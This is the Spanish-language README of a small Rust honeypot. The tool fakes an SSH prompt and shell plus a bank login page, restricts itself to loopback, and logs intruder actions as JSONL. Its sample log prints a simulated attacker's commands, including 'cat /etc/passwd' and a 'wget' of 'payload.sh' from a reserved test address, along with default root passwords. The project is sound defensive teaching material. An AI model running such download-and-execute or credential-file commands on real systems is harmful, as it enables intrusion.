# Honeypot casero

[![CI](https://github.com/runer0101/honeypot-casero/actions/workflows/ci.yml/badge.svg)](https://github.com/runer0101/honeypot-casero/actions/workflows/ci.yml)
[![Licencia](https://img.shields.io/badge/licencia-MIT-1e7a45?style=flat-square)](LICENSE)

Herramienta de seguridad para observar a un atacante: una **trampa** que parece un
servicio real, deja entrar al atacante y **graba todo lo que hace**.

- Rust, **cero dependencias externas** (solo la biblioteca estándar)
- Trampa tipo SSH (banner, `login:`, `Password:` y shell falso) y trampa web de login
- Registro en JSONL, un objeto por línea, con hora exacta
- Visor para leer el registro como texto, y un atacante simulado para la demostración

El proyecto hermano es [`analizador-phishing`](../analizador-phishing): un detector de
enlaces de phishing que no visita los enlaces, con su demo en vivo en
<https://runer0101.github.io/analizador-phishing/>.

## Requisitos

Rust 1.74 o superior. Nada más: sin Python, sin Docker, sin red.

```bash
git clone https://github.com/runer0101/honeypot-casero.git
cd honeypot-casero
cargo build --release
```

El binario queda en `target/release/honeypot` y funciona sin internet.

También hay versiones ya compiladas en la [release v0.1.0](https://github.com/runer0101/honeypot-casero/releases/tag/v0.1.0):

| Sistema | Archivo |
| --- | --- |
| Linux x86-64 | `honeypot-linux-x86_64` |
| Linux ARM64 | `honeypot-linux-aarch64` |
| macOS Intel | `honeypot-macos-x86_64` |
| macOS Apple Silicon | `honeypot-macos-aarch64` |
| Windows x86-64 | `honeypot-windows-x86_64.exe` |

En Linux y macOS hay que darle permiso de ejecución: `chmod +x honeypot-linux-x86_64`.

## Uso

```bash
# Levantar las dos trampas en loopback
target/release/honeypot serve --bind 127.0.0.1 --ssh-port 2222 --http-port 8080 --log logs/honeypot.jsonl

# El atacante simulado (solo se conecta a loopback)
target/release/honeypot attack --target 127.0.0.1:2222

# El registro en texto legible
target/release/honeypot show --log logs/honeypot.jsonl

# El registro en JSON
target/release/honeypot show --log logs/honeypot.jsonl --json
```

Demostración completa en un comando:

```bash
scripts/demo.sh
```

## Qué hace la trampa

**Trampa tipo SSH** (puerto 2222 por defecto). Es una **emulación de banner y prompt en
texto**, no un servidor SSH real: un `ssh` de verdad no entra. Al conectar:

1. Anuncia `SSH-2.0-OpenSSH_9.6 Ubuntu-3ubuntu13`.
2. Pide `login:` y `Password:`, y registra cada intento con usuario y contraseña.
3. **Rechaza las dos primeras credenciales y acepta la tercera.** Un honeypot no es una
   barrera: es una cámara. Si bloqueara al atacante no sabríamos qué viene después.
4. Entrega un shell falso (`root@victima:~# `) que responde a `uname -a`, `whoami`, `id`,
   `ls`, `cat /etc/passwd`, `pwd`, `wget`/`curl` y `exit`. Todas las órdenes quedan
   registradas. Una descarga simulada deja el mensaje real de `wget` (`Saving to: ...`,
   `200 OK`) y se anota el archivo, los bytes y la herramienta.
5. **Límites de sesión**: máximo 10 credenciales por sesión y 5 minutos de inactividad.
   Si el atacante se pasa o se queda callado, la sesión se cierra y queda anotado
   (`limite_intentos`, `sesion_timeout`).

**Trampa web** (puerto 8080 por defecto). `GET /` devuelve un login falso de banco; el
`POST /login` registra usuario y contraseña y responde siempre «Sesión iniciada»: **no
autentica a nadie** y no da acceso a ningún recurso real.

## El registro

JSONL: un objeto JSON por línea, con `ts` (ISO-8601 UTC), `service`, `event`, `peer`,
`session` y los campos del evento (`user`, `password`, `command`, `url`, `status`).

```
Sesión 1 · ssh · 127.0.0.1:47956 · 14 eventos · 0s
  Credenciales: root/123456 (denied) · root/admin (denied) · root/toor (accepted)
  Órdenes (7): uname -a; whoami; id; ls; cat /etc/passwd; wget http://198.51.100.7/payload.sh; exit
  Descargas: http://198.51.100.7/payload.sh
```

El visor además agrega **estadísticas** de todas las sesiones: cuántas hubo, cuántos
intentos de acceso, cuántas órdenes, cuántas descargas, cuántos clics en la web, cuántas IP
distintas, los usuarios más intentados y las órdenes más usadas.

En crudo:

```json
{"ts":"2026-11-20T23:42:59Z","service":"ssh","event":"login_attempt","peer":"127.0.0.1:47956","session":"s-1","user":"root","password":"123456","result":"denied"}
```

## Guardas de seguridad

- `serve` **solo** acepta direcciones de loopback (`127.0.0.1` o `::1`). No hay bandera
  para saltarse la guarda: el programa se niega con un mensaje explícito.
- `attack` también solo se conecta a loopback: este material se usa contra el laboratorio
  propio, nunca contra terceros.
- El «atacante» de la demostración es un script del propio proyecto (bucle cerrado).
- Las credenciales de la demo son sintéticas y la dirección de descarga pertenece al rango
  reservado de pruebas `198.51.100.0/24` (RFC 5737): nunca se resuelve ni se contacta.

## Estructura

```
honeypot-casero/
├── src/
│   ├── lib.rs        # módulos del proyecto
│   ├── log.rs        # eventos, log JSONL y marcas de tiempo
│   ├── shell.rs      # el shell falso
│   ├── trap.rs       # trampa tipo SSH y trampa web
│   ├── viewer.rs     # resumen legible del registro
│   └── attack.rs     # el atacante simulado
├── tests/integration.rs  # sesión completa contra la trampa real
├── .github/workflows/
│   ├── ci.yml        # formato, lints y pruebas en cada push
│   └── release.yml   # binarios de Linux, macOS y Windows en cada tag
├── docs/
│   ├── PRESENTACION.md   # el guion completo de los 12 minutos
│   ├── GUION.md          # la parte del honeypot
│   ├── DIAPOSITIVAS.md   # diapositivas 6 a 10
│   ├── ENSAYO.md         # ensayo sin internet y plan B
│   ├── CHECKLIST-EXPOSICION.md # los diez puntos del día de la exposición
│   └── captura-demo.png  # captura real de la demostración
└── scripts/demo.sh   # la demostración del honeypot en un comando
```

## Verificación

```bash
cargo test                                              # 38 pruebas
cargo clippy --all-targets -- -D warnings
cargo fmt -- --check
```

Las pruebas levantan la trampa en un puerto efímero de loopback, conducen una sesión
completa y comprueban que cada orden del atacante queda emparejada con su respuesta.

## Aviso legal

Material para un laboratorio controlado y **autorizado**. Todo corre en `127.0.0.1`, las
credenciales son inventadas y ninguna trampa toca sistemas de terceros.
